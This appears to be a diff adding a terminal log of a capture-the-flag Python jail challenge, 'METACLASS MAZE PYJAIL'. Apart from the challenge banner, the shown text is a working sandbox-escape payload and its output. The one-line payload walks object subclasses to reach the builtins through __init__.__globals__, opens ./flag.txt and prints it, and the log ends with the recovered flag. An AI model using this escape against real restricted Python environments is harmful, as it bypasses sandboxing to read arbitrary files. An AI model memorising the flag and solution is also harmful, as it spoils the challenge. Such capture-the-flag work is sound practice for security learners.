@@ -1,0 +1,8 @@
+python3 server.py
+=== METACLASS MAZE PYJAIL - FILE EDITION ===
+The class system has been... modified.
+All your favorite functions are trapped!
+Can you read the contents of ./flag.txt?
+
+Enter your escape code: next(x.__init__.__globals__['__builtins__']['print'](x.__init__.__globals__['__builtins__']['open']('./flag.txt').read()) for x in ().__class__.__bases__[0].__subclasses__() if hasattr(x, '__init__') and hasattr(x.__init__, '__globals__') and '__builtins__' in x.__init__.__globals__)
+bcactf{5u0_d1n6_10ck_1n_m4n_4nd_h0p_0ff_7h3_8r41nr07}
